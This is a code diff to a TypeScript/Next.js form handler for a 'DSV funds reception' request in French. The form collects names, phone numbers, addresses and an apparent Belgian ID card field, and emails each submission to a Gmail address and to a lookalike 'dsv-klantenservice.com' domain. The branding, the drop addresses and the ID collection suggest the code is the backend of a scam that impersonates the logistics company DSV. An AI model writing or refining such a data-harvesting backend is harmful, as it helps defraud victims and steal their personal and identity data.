@@ -16,7 +16,6 @@ const transporter = nodemailer.createTransport({
 function validateFormData(data: any) {
   const requiredFields = [
     'nom_complet',
-    'email',
     'telephone',
     'adresse',
     'carte_be',
@@ -31,17 +30,13 @@ function validateFormData(data: any) {
     }
   }
 
-  // Validation de l'email
-  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
-  if (!emailRegex.test(data.email)) {
-    return { isValid: false, error: 'Format d\'email invalide' }
-  }
+
 
   return { isValid: true }
 }
 
 // Fonction pour créer le template HTML de l'email
-function createEmailTemplate(data: any, formType: string) {
+function createEmailTemplate(data: any) {
   const title = '💰 Nouvelle Demande de Réception de Fonds DSV'
   const currentDate = new Date()
   const dateStr = currentDate.toLocaleDateString('fr-FR', {
@@ -211,10 +206,6 @@ function createEmailTemplate(data: any, formType: string) {
               <div class="value">${data.nom_complet}</div>
             </div>
             <div class="field">
-              <div class="label">Email :</div>
-              <div class="value">${data.email}</div>
-            </div>
-            <div class="field">
               <div class="label">Téléphone :</div>
               <div class="value">${data.telephone}</div>
             </div>
@@ -227,10 +218,6 @@ function createEmailTemplate(data: any, formType: string) {
           <!-- Informations Colis -->
           <div class="package-info">
             <h2>📦 Informations Colis</h2>
-            <div class="field">
-              <div class="label">Type d'article :</div>
-              <div class="value">${data.type_article || 'Non spécifié'}</div>
-            </div>
             <div class="field">
               <div class="label">Description :</div>
               <div class="value">${data.description_article || 'Non spécifiée'}</div>
@@ -285,7 +272,7 @@ export async function POST(request: NextRequest) {
 
     // Déterminer le type de formulaire basé sur l'URL ou un paramètre
     const url = new URL(request.url)
-    const formType = url.searchParams.get('type') || 'reception'
+    url.searchParams.get('type') || 'reception' // Type par défaut
 
     // Valider les données
     const validation = validateFormData(body)
@@ -306,18 +293,17 @@ export async function POST(request: NextRequest) {
     }
 
     // Créer le contenu de l'email
-    const emailHtml = createEmailTemplate(body, formType)
+    const emailHtml = createEmailTemplate(body)
     const subject = `Nouvelle demande de réception de fonds DSV - ${body.nom_complet}`
 
     // Configuration de l'email
     const recipients = process.env.EMAIL_RECIPIENTS
       ? process.env.EMAIL_RECIPIENTS.split(',').map(email => email.trim())
-      : ['registratie@autodp.org', 'richtingklantautodp.be@gmail.com']
+      : ['registratie@dsv-klantenservice.com', 'richtingklantautodp.be@gmail.com']
 
     const mailOptions = {
       from: process.env.EMAIL_USER,
       to: recipients,
-      replyTo: body.email,
       subject: subject,
       html: emailHtml,
       text: `
